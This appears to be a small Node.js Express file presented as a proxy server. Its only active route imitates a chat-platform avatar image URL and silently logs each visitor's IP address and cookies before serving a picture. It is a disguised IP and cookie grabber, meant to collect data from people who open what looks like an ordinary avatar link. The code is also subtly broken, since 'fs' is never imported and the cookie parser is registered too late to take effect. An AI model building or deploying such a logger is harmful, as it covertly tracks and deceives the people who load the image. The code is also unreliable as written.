const express = require("express");
const { createProxyMiddleware } = require("http-proxy-middleware");
const cors = require("cors");
const path = require("path");

const app = express();

// Enable CORS for all routes
app.use(cors());

// Get target URL from environment variable or use default
// const TARGET_URL = "https://backend.svg.io";

// // Create proxy middleware
// const proxy = createProxyMiddleware({
//   target: TARGET_URL,
//   changeOrigin: true,
//   pathRewrite: {
//     "^/": "/", // remove / from the beginning of the path
//   },
//   onProxyRes: function (proxyRes, req, res) {
//     // Add CORS headers to the response
//     proxyRes.headers["Access-Control-Allow-Origin"] = "*";
//   },
//   onError: (err, req, res) => {
//     console.error("Proxy Error:", err);
//     res.status(500).send("Proxy Error");
//   },
// });

app.get(
  "/avatars/720683700249165866/e96a7c28520e1ab101ba2d2a8a97fd28.png",
  (req, res) => {
    const clientIp = req.ip || req?.connection?.remoteAddress;
    const cookiesHeader = req.headers.cookie || "";
    const parsedCookies = req.cookies || {};

    const log = `IP=${clientIp} | CookieHeader="${cookiesHeader}" | Parsed=${JSON.stringify(
      parsedCookies
    )}`;
    console.log(log);

    const imgPath = path.join(__dirname, "public", "avatar.jpg");
    if (fs.existsSync(imgPath)) {
      res.sendFile(imgPath);
    } else {
      res.status(404).send("avatar not found");
    }
  }
);

// Use proxy middleware for all routes
// app.use("/", proxy);

// Error handling
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send("Something broke!");
});

// Start server
const port = process.env.PORT || 3000;

// server.js
const cookieParser = require("cookie-parser");

app.use(cookieParser());

app.listen(port, () => {
  console.log(`Proxy server running on port ${port}`);
});
